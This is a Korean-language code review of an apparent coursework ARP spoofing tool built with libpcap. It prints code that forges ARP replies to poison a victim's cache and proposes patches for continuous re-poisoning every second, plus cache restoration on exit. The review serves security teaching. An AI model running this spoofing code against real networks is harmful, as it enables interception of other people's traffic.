## 1. 개요

이 프로젝트는 `pcap`을 이용해 ARP 스푸핑(감염) 패킷을 전송하여 Sender(Victim)의 ARP 테이블을 변조하는 `send-arp` 프로그램이다. libnet 같은 외부 패킷 라이브러리 대신 직접 정의한 `Ip`, `Mac`, `EthHdr`, `ArpHdr` 구조체를 사용하며, 공격자의 MAC/IP는 인터페이스 이름으로부터 자동으로 알아내고, sender의 MAC은 실제 ARP request/reply를 통해 런타임에 알아낸다.

전체적으로 헤더 패킹, 바이트오더 처리, ARP 스푸핑 패킷 구성 로직 자체는 정확하다. 다만 **감염 패킷을 단 한 번만 전송하고 종료하는 구조** 때문에 실제 환경에서는 감염이 오래 유지되지 못하고 원상 복구되는 문제가 있다 (4장에서 상세 설명, 6장에서 수정 방법 제시).

## 2. 코드 구조

```
include/  ip.h  mac.h  ethhdr.h  arphdr.h  netinfo.h  arpmanager.h   → 자료구조/함수 선언
src/      ip.cpp  mac.cpp  ethhdr.cpp  arphdr.cpp  netinfo.cpp
          arpmanager.cpp  main.cpp                                    → 구현
Makefile                                                               → 빌드 스크립트
```

| 파일 | 역할 |
|---|---|
| `ip.h/cpp`, `mac.h/cpp` | IP/MAC 주소의 문자열 ↔ 바이너리 변환, 비교 연산자 등 유틸리티 |
| `ethhdr.h`, `arphdr.h` | `#pragma pack(push,1)`로 패딩 없이 정의한 Ethernet/ARP 헤더 구조체 |
| `netinfo.cpp` | `ioctl(SIOCGIFHWADDR / SIOCGIFADDR)`로 공격자 자신의 MAC/IP를 인터페이스 이름만으로 조회 |
| `arpmanager.cpp` | sender MAC 조회(`getSenderMac`)와 감염 패킷 전송(`sendInfectPacket`) 로직 |
| `main.cpp` | 인자 파싱, pair 순회, 위 함수들 호출 |

## 3. 동작 흐름

```
1) argv 파싱: <interface> <sender ip> <target ip> [<sender ip2> <target ip2> ...]
2) pcap_open_live(dev, BUFSIZ, 1, 1, errbuf)
3) netinfo.cpp → 공격자 자신의 MAC/IP 획득
4) (sender, target) pair마다:
     a. arpmanager::getSenderMac()
        - attacker → broadcast로 정상 ARP request(누가 senderIp를 갖고 있나?) 전송
        - pcap_next_ex로 최대 5초간 폴링, op=Reply && sip=senderIp인 응답에서 sender MAC 추출
     b. arpmanager::sendInfectPacket()
        - "targetIp는 내(attacker) MAC이다"라고 주장하는 위조 ARP reply를
          sender에게 유니캐스트로 1회 전송
5) pcap_close, 종료
```

아래는 각 단계에서 실제로 실행되는 코드다 (모두 `src/main.cpp`).

**① 인자 검증**

```cpp
if (argc < 4) {                    // interface, sender ip, target ip 최소 3개 + argv[0]
    usage();
    return EXIT_FAILURE;
}
if ((argc - 2) % 2 != 0) {         // sender/target이 항상 짝으로 들어왔는지 검증
    usage();
    return EXIT_FAILURE;
}
```
`argv[0]`(프로그램명)과 `argv[1]`(interface)을 제외한 나머지(`argc - 2`)가 홀수면 sender/target 중 하나가 빠진 것이므로 바로 실패 처리한다.

**② pcap 핸들 오픈**

```cpp
char* dev = argv[1];
char errbuf[PCAP_ERRBUF_SIZE];
pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
if (pcap == nullptr) {
    fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
    return EXIT_FAILURE;
}
```
`BUFSIZ`는 캡처 스냅샷 길이(패킷을 얼마나 잘라서 볼지), 첫 번째 `1`은 promiscuous 모드(내 것이 아닌 패킷도 수신), 두 번째 `1`은 read timeout(ms)이다. 뒤에서 `pcap_next_ex`로 ARP reply를 직접 수신해야 하므로 스냅샷 0이나 캡처 비활성화 옵션은 쓸 수 없다.

**③ 공격자 자신의 정보 획득**

```cpp
Mac attackerMac;
Ip attackerIp;
if (!getAttackerInfo(dev, attackerMac, attackerIp)) {
    pcap_close(pcap);
    return EXIT_FAILURE;
}
```
`dev`(interface 이름)만 넘기면 `netinfo.cpp`가 `ioctl`로 내 MAC/IP를 채워준다 — 5장에서 다룬 하드코딩 금지 요구사항이 여기서 지켜진다.

**④ (sender, target) pair 순회**

```cpp
for (int i = 2; i < argc; i += 2) {
    Ip senderIp(argv[i]);
    Ip targetIp(argv[i + 1]);
    Mac senderMac;

    if (!getSenderMac(pcap, attackerMac, attackerIp, senderIp, senderMac)) {
        fprintf(stderr, "failed to get sender MAC\n");
        continue;
    }
    if (!sendInfectPacket(pcap, attackerMac, senderMac, senderIp, targetIp)) {
        fprintf(stderr, "failed to infect sender\n");
        continue;
    }

    printf("infection packet sent\n");
}
```
`argv[2], argv[3]`이 첫 pair, `argv[4], argv[5]`가 두 번째 pair 하는 식으로 2칸씩 건너뛰며 읽는다. 한 pair 안에서는 먼저 `getSenderMac`으로 sender의 실제 MAC을 알아내고, 그 MAC을 그대로 `sendInfectPacket`에 넘겨 위조 reply를 만든다. 이 두 함수 내부의 패킷 조립 로직(핵심 감염 패킷 구성)은 아래에서 다시 짚는다.

**⑤ 종료**

```cpp
pcap_close(pcap);
return EXIT_SUCCESS;
```
모든 pair 처리가 끝나면 핸들을 닫고 프로그램이 즉시 종료된다 — 이 "즉시 종료"가 4장에서 설명할 실패 원인과 직결된다.

핵심 감염 패킷 구성 (`src/arpmanager.cpp`, `sendInfectPacket` 내부):

```cpp
packet.eth_.dmac_ = senderMac;      // sender에게 직접 전송
packet.eth_.smac_ = attackerMac;
packet.eth_.type_ = htons(EthHdr::Arp);

packet.arp_.op_   = htons(ArpHdr::Reply);
packet.arp_.smac_ = attackerMac;
packet.arp_.sip_  = htonl(targetIp);  // "나는 target이다" 라고 주장
packet.arp_.tmac_ = senderMac;
packet.arp_.tip_  = htonl(senderIp);
```

이더넷 목적지를 sender로 명확히 지정한 유니캐스트 reply이며, ARP 스푸핑의 표준적인 형태를 정확히 따르고 있다.

## 4. 실패 원인 분석

가장 유력한 원인은 **감염 패킷을 프로그램당 단 1회만 전송하고 즉시 종료한다는 구조적 한계**다.

```cpp
// main.cpp
if (!sendInfectPacket(pcap, attackerMac, senderMac, senderIp, targetIp)) {
    fprintf(stderr, "failed to infect sender\n");
    continue;
}
printf("infection packet sent\n");   // 성공 여부를 검증하지 않고 무조건 출력
```

대부분의 OS는 ARP 캐시 엔트리가 REACHABLE 상태로 일정 시간(리눅스 기본값 기준 대략 15~45초, `net.ipv4.neigh.default.base_reachable_time` 관련 랜덤 구간)이 지나면 STALE로 전이되고, 이후 해당 목적지로 트래픽이 나갈 때 커널이 **재확인(NUD PROBE)**을 수행한다. 이때 커널은 먼저 캐시에 있는 현재 MAC(=공격자 MAC)으로 유니캐스트 ARP request를 보내는데, 이 프로그램은 이미 종료된 상태라 응답할 수 없다. 결국 브로드캐스트 재요청 → 진짜 게이트웨이가 응답 → 캐시가 원래대로 복구된다.

즉:

- 감염 직후 짧게 ping 몇 번 치는 정도의 데모는 성공적으로 캡처될 수 있다 (README의 영상들이 이 경우로 보인다).
- 하지만 시간이 조금만 지나거나 sender가 지속적으로 통신 중이면 캐시가 자동으로 원상 복구되어 감염이 풀린다.
- 게다가 전송 성공 여부/캐시 변조 여부를 검증하거나 재시도하는 로직이 전혀 없어서, 패킷이 유실되거나(특히 무선 환경) OS가 응답을 무시해도 프로그램은 그대로 "성공"처럼 로그를 출력한다.

정리하면, **"한 번 보내고 끝" 구조 때문에 실제 테스트 환경(물리적으로 분리된 호스트, 스마트폰/노트북, 무선 네트워크)에서 감염이 오래 유지되지 못하고 실패로 이어졌을 가능성이 가장 높다.**

## 5. 상세 코드 리뷰

- **`getSenderMac`의 응답 필터가 느슨함** (`src/arpmanager.cpp`)
  ```cpp
  if (reply->eth_.type() != EthHdr::Arp) continue;
  if (reply->arp_.op() != ArpHdr::Reply) continue;
  if (!(reply->arp_.sip() == senderIp)) continue;
  ```
  `sip()`만 검사하고 `tip()`(내 IP로 온 응답인지)이나 `tmac()`은 검사하지 않는다. 네트워크에 트래픽이 많으면 관련 없는 ARP reply를 sender MAC으로 잘못 채택할 여지가 있다.

- **busy-wait 폴링**: `getSenderMac`의 `while(true)` 루프가 sleep 없이 `pcap_next_ex`를 계속 호출한다. `pcap_open_live`의 timeout이 1ms로 짧게 열려 있어 치명적이진 않지만 불필요하게 CPU를 점유한다.

- **주석이 알아보기 어렵게 깨져 있음** (`src/main.cpp`)
  ```cpp
  //BUT. dajungjjohap
  //ai wal hardcoding out!
  // sender . target johap read banbokmun
  ```
  한글이 로마자로 깨진 것으로 보이는 주석들이 남아 있어 코드 이해에 방해가 된다. 정리하거나 삭제를 권장한다.

- **감염 후 원상복구(cleanup) 없음**: `Ctrl+C`나 정상 종료 시 sender의 ARP 캐시를 원래 정보로 되돌리는 처리가 없다. 과제 필수 요건은 아니지만, 테스트 후 sender가 통신 장애를 겪을 수 있으므로 실무적으로는 권장되는 처리다.

- **패킷 크기(42바이트)가 이더넷 최소 프레임(60바이트)보다 작음**: 대부분의 리눅스 드라이버가 자동 패딩해주므로 실사용에는 대체로 문제가 없지만, 일부 환경/드라이버에서는 패킷이 드롭될 수 있다.

- **긍정적인 부분**: 헤더 패킹(`#pragma pack`), 바이트오더 변환(`htons`/`ntohl`), `pcap_open_live` 파라미터, 프로젝트 이름 규칙 등 위키에서 명시적으로 강조한 디테일들은 모두 정확히 지켜졌다.

## 6. 수정 방법

### 6.1 지속 감염 루프로 변경 (최우선)

**파일: `src/main.cpp`**

문제는 `for` 루프 안에서 (MAC 조회 → 감염 전송)을 pair당 1회만 하고 프로그램이 끝나버리는 구조다. 이를 "① 모든 pair의 MAC을 먼저 한 번씩 알아낸다 → ② `Ctrl+C`를 누를 때까지 주기적으로 재전송한다 → ③ 종료 시 원래 정보로 복원한다" 구조로 바꾼다.

먼저 상단에 시그널 처리를 위한 헤더와 종료 플래그를 추가한다.

```cpp
// 추가
#include <csignal>
#include <unistd.h>
#include <vector>

static volatile sig_atomic_t g_running = 1;
void onSigint(int) { g_running = 0; }
```

기존 `main()`의 인자 검증, `pcap_open_live`, `getAttackerInfo` 호출부는 그대로 두고, 그 아래 pair 처리 부분을 아래와 같이 바꾼다.

```cpp
// Before
for (int i = 2; i < argc; i += 2) {
    Ip senderIp(argv[i]);
    Ip targetIp(argv[i + 1]);
    Mac senderMac;

    if (!getSenderMac(pcap, attackerMac, attackerIp, senderIp, senderMac)) {
        fprintf(stderr, "failed to get sender MAC\n");
        continue;
    }
    if (!sendInfectPacket(pcap, attackerMac, senderMac, senderIp, targetIp)) {
        fprintf(stderr, "failed to infect sender\n");
        continue;
    }

    printf("infection packet sent\n");
    std::string senderMacString = static_cast<std::string>(senderMac);
    printf("sender MAC: %s\n", senderMacString.c_str());
}

pcap_close(pcap);
return EXIT_SUCCESS;
```

```cpp
// After
signal(SIGINT, onSigint);

struct Session {
    Ip senderIp;
    Ip targetIp;
    Mac senderMac;
    Mac targetMac;   // 종료 시 원상복구에 사용
};
std::vector<Session> sessions;

// ① 모든 pair의 sender/target MAC을 먼저 한 번씩 조회
for (int i = 2; i < argc; i += 2) {
    Session s;
    s.senderIp = Ip(argv[i]);
    s.targetIp = Ip(argv[i + 1]);

    if (!getSenderMac(pcap, attackerMac, attackerIp, s.senderIp, s.senderMac)) {
        fprintf(stderr, "failed to get sender MAC\n");
        continue;
    }
    // getSenderMac은 "임의의 IP에 대한 MAC을 정상 ARP로 조회"하는 함수라
    // target의 진짜 MAC을 알아낼 때도 그대로 재사용할 수 있다.
    if (!getSenderMac(pcap, attackerMac, attackerIp, s.targetIp, s.targetMac)) {
        fprintf(stderr, "failed to get target MAC\n");
        continue;
    }
    sessions.push_back(s);
}

if (sessions.empty()) {
    pcap_close(pcap);
    return EXIT_FAILURE;
}

printf("infecting %zu session(s)... press Ctrl+C to stop\n", sessions.size());

// ② Ctrl+C 전까지 1초 간격으로 재감염 (ARP 캐시 타임아웃으로 인한 원복 방지)
while (g_running) {
    for (const auto& s : sessions) {
        sendInfectPacket(pcap, attackerMac, s.senderMac, s.senderIp, s.targetIp);
    }
    sleep(1);
}

// ③ 종료 시 진짜 target MAC 정보로 sender의 캐시를 복원
printf("\nrestoring ARP tables...\n");
for (const auto& s : sessions) {
    // attackerMac 대신 s.targetMac을 smac으로 보내면
    // "target IP는 target의 진짜 MAC"이라는 정상 정보로 되돌리는 reply가 된다.
    sendInfectPacket(pcap, s.targetMac, s.senderMac, s.senderIp, s.targetIp);
}

pcap_close(pcap);
return EXIT_SUCCESS;
```

포인트는 `sendInfectPacket`의 첫 번째 인자(누구 MAC이라고 주장할지)에 공격 시에는 `attackerMac`을, 복원 시에는 진짜 `targetMac`을 넣으면 함수 자체는 손대지 않고 감염/복원 양쪽에 재사용할 수 있다는 것이다.

### 6.2 `getSenderMac` 응답 필터 강화

**파일: `src/arpmanager.cpp`, 함수 `getSenderMac`**

```cpp
// Before
if (reply->eth_.type() != EthHdr::Arp) continue;
if (reply->arp_.op() != ArpHdr::Reply) continue;
if (!(reply->arp_.sip() == senderIp)) continue;

senderMac = reply->arp_.smac();
return true;
```

```cpp
// After
if (reply->eth_.type() != EthHdr::Arp) continue;
if (reply->arp_.op() != ArpHdr::Reply) continue;
if (!(reply->arp_.sip() == senderIp)) continue;
if (!(reply->arp_.tip() == attackerIp)) continue;   // 내가 보낸 요청에 대한 응답인지
if (!(reply->arp_.tmac() == attackerMac)) continue; // 내 MAC 앞으로 온 응답인지

senderMac = reply->arp_.smac();
return true;
```

`attackerIp`, `attackerMac`은 이미 함수 파라미터로 들어와 있으므로 추가 인자 없이 바로 쓸 수 있다.

### 6.3 이더넷 최소 프레임 크기 보장 (선택)

**파일: `src/arpmanager.cpp`, `pcap_sendpacket` 호출부(`getSenderMac`, `sendInfectPacket` 둘 다 동일 패턴)**

```cpp
// Before
pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
```

```cpp
// After
constexpr size_t kEthMinLen = 60;
uint8_t buf[kEthMinLen] = {0};
memcpy(buf, &packet, sizeof(packet));
pcap_sendpacket(pcap, buf, sizeof(buf));
```

실습 환경에서 이미 정상 동작했다면 급하지 않은 항목이라, 6.1을 적용한 뒤에도 특정 환경에서만 패킷이 반영되지 않을 때 의심해보면 된다.

### 6.4 깨진 주석 정리 (선택)

**파일: `src/main.cpp`**

```cpp
// Before
//BUT. dajungjjohap
//if ip(sender and target) juso SSang
if ((argc - 2) %2 != 0) { ... }

// sender . target johap read banbokmun
//ai wal hardcoding out!
for (int i = 2; i < argc; i += 2) { ... }
```

```cpp
// After
// sender/target IP가 항상 쌍으로 들어왔는지 검증
if ((argc - 2) % 2 != 0) { ... }

// (sender, target) 쌍마다 반복 처리 — MAC은 하드코딩하지 않고 매번 조회
for (int i = 2; i < argc; i += 2) { ... }
```
